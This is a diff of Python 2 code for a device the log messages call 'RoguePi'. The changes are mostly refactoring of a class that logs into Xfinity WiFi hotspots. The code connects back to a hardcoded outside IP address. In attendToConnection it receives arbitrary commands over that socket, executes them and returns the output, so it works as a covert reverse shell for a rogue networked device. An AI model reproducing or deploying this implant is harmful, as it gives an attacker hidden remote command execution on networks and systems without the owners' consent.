@@ -96,7 +96,18 @@ lights = VisualOutput()
 class HomeConnector:
 
     # Default parameters
-    HOMEPORT = 8554
+    HOMEPORT = 8554  # Large enough number that this won't interfere with other processes
+    # Attend to connection constants
+    LARGE_FILE_TIMEOUT = 10
+    PING_SLEEP = 5
+    COMMAND_WAIT = 2
+    RECV_CMD_CHUNK = 2048
+    # Connection searching constants
+    NO_WIFI_SLEEP = 3
+    LOSE_CONNECTION_TIMEOUT = 20
+    LOGIN_TIMEOUT = 2
+    HOME_SOCKET_TIMEOUT = 15
+    HOME_SOCKET_RETRIES = 3
 
     # Constants
     loginPostUrl = "https://wifilogin.xfinity.com/user_login.php"
@@ -107,13 +118,6 @@ class HomeConnector:
 
     loginPortal = "/portal_captive.php"
     testURL = "google.com"
-
-    @staticmethod
-    def exit(signal, frame):
-        logging.info("Exiting...")
-        lights.all_off()
-        PiExecute("killall")
-        sys.exit(0)
 
     def __init__(self, xfinityUsername, xfinityPassword):
         """Initialize connector and store login information."""
@@ -136,11 +140,21 @@ class HomeConnector:
         signal.signal(signal.SIGINT, self.exit)
 
     @staticmethod
-    def attendToConnection(conn):
-        LARGE_FILE_TIMEOUT = 10
-        PING_SLEEP = 5
-        COMMAND_WAIT = 2
+    def exit(signal, frame):
+        """Runs on CTRL-C. Exits the program by killing main thread and other threads."""
+        logging.info("Exiting...")
+        lights.all_off()
+        PiExecute("killall")
+        sys.exit(0)
 
+    @staticmethod
+    def getBetween(identifiers, haystackStr):
+        """Get a section of text in-between two identifiers."""
+        startLoc = haystackStr.find(identifiers[0]) + len(identifiers[0])
+        endLoc = haystackStr[startLoc:].find(identifiers[1]) + startLoc
+        return haystackStr[startLoc:endLoc]
+
+    def attendToConnection(self, conn):
         logging.debug('Attending to connection...')
         while True:
             # Use try loop to handle socket problems due to spotty internet or device movement
@@ -157,19 +171,20 @@ class HomeConnector:
                     lights.pong()
 
                 # Receive and execute commands
-                ready = select.select([conn], [], [], COMMAND_WAIT)
+                ready = select.select([conn], [], [], self.COMMAND_WAIT)
                 if ready[0]:  # if command ready
-                    cmd = conn.recv(2048)
+                    cmd = conn.recv(self.RECV_CMD_CHUNK)
                     log.info("[+] Got data: %s" % cmd)
                     response = PiExecute(cmd)
                     if not response:
                         response = TXT + "[-] Run CMD returned None"
-                    # log.info("[i] Server response: %s" % response)
+                    log.debug("[i] RoguePi response: %s" % response)
                     conn.sendall(response)
-                    if len(response) > 2048:  # extra time for sending a large file
-                        time.sleep(LARGE_FILE_TIMEOUT)
+                    # Give the server extra time after we have sent a large file
+                    if len(response) > self.RECV_CMD_CHUNK:
+                        time.sleep(self.LARGE_FILE_TIMEOUT)
                 else:
-                    time.sleep(PING_SLEEP)  # sleep a little before pinging
+                    time.sleep(self.PING_SLEEP)  # sleep a little before pinging
             # If something went wrong with our connection
             except Exception, e:
                 log.info("[-] Home sending/receiving error: %s" % str(e))
@@ -179,14 +194,6 @@ class HomeConnector:
 
     def searchForConnection(self):
         """Return a socket after attempting to connect to the HomeBase server."""
-
-        # Constants
-        NO_WIFI_SLEEP = 3
-        LOSE_CONNECTION_TIMEOUT = 20
-        LOGIN_TIMEOUT = 2
-        HOME_SOCKET_TIMEOUT = 15
-        HOME_SOCKET_RETRIES = 3
-
         while True:  # Main loop
             logging.info('Checking wifi...')
 
@@ -203,15 +210,15 @@ class HomeConnector:
                     # Try to connect to home
                     log.info("Trying to connect to home...")
                     self.socket = socket.socket()
-                    self.socket.settimeout(HOME_SOCKET_TIMEOUT)  # Initial connection
+                    self.socket.settimeout(self.HOME_SOCKET_TIMEOUT)  # Initial connection
                     nFails = 0
-                    for i in range(HOME_SOCKET_RETRIES):  # retries for connection before checking wifi
+                    for i in range(self.HOME_SOCKET_RETRIES):  # retries for connection before checking wifi
                         if self.attemptHomeConnection():
                             break
                         else:
                             log.info('[-] Failed home socket connection')
                             nFails += 1
-                    if nFails == HOME_SOCKET_RETRIES:  # if both attempts failed
+                    if nFails == self.HOME_SOCKET_RETRIES:  # if both attempts failed
                         log.info('[-] Exceeded number of home socket retries!')
                         del self.socket
                         continue
@@ -219,7 +226,7 @@ class HomeConnector:
                     # If can access home
                     log.info(green("[+] Connected to home base!"))
                     lights.updateStatus((1, 1, 1))
-                    self.socket.settimeout(LOSE_CONNECTION_TIMEOUT)  # timeout for losing connection
+                    self.socket.settimeout(self.LOSE_CONNECTION_TIMEOUT)  # timeout for losing connection
 
                     self.attendToConnection(self.socket)  # Run commands and PING/PONG to maintain connection
 
@@ -228,19 +235,12 @@ class HomeConnector:
                 # if internet connection broke
                 log.info(red("[--] Internet login unsuccessful"))
                 lights.updateStatus((1, 0, 0))
-                time.sleep(LOGIN_TIMEOUT)
+                time.sleep(self.LOGIN_TIMEOUT)
 
             # if no wifi connection
             lights.updateStatus((0, 0, 0))
             log.info(red("[-] Wifi connection broken"))
-            time.sleep(NO_WIFI_SLEEP)  # wait for wifi connection
-
-    @staticmethod
-    def getBetween(identifiers, haystackStr):
-        """Get a section of text in between two identifiers."""
-        startLoc = haystackStr.find(identifiers[0]) + len(identifiers[0])
-        endLoc = haystackStr[startLoc:].find(identifiers[1]) + startLoc
-        return haystackStr[startLoc:endLoc]
+            time.sleep(self.NO_WIFI_SLEEP)  # wait for wifi connection
 
     @staticmethod
     def checkWifi():
@@ -252,7 +252,7 @@ class HomeConnector:
             return False
 
     def login(self):
-        """Login to XfinityWifi hotspot."""
+        """Login to an XfinityWifi hotspot."""
 
         # Get redirect page
         page = self.session.get("http://%s" % self.testURL)
@@ -283,10 +283,11 @@ class HomeConnector:
             return False
 
     def attemptHomeConnection(self):
+        """Attempt a connection to our HomeServer."""
         try:
             self.socket.connect(("67.184.6.29", self.HOMEPORT))
             return True
-        except Exception, e:
+        except Exception, e:  # If the socket times out or gives us an error
             log.warn("Error: %s" % str(e))
             return False
 
